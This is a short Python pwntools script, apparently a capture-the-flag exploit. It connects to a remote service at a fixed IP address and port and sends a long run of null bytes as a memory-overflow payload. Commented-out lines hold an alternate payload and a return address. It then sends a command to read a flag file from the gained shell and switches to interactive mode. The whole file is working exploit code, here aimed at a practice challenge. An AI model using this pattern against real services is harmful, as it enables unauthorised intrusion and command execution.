from pwn import *

context(arch='i386', os='linux')

#p = process('./your_name', stdout=PIPE)
p= remote("13.232.171.97","6789")
p.recvuntil("It is very powerful also")


p.sendline("\x00"*1000)

#p.sendline("A"+"\x00"*511+"A\x00")
#p.send(p32(0x080491d2))

p.sendline("cat /home/cheating/flag.txt")

p.interactive()
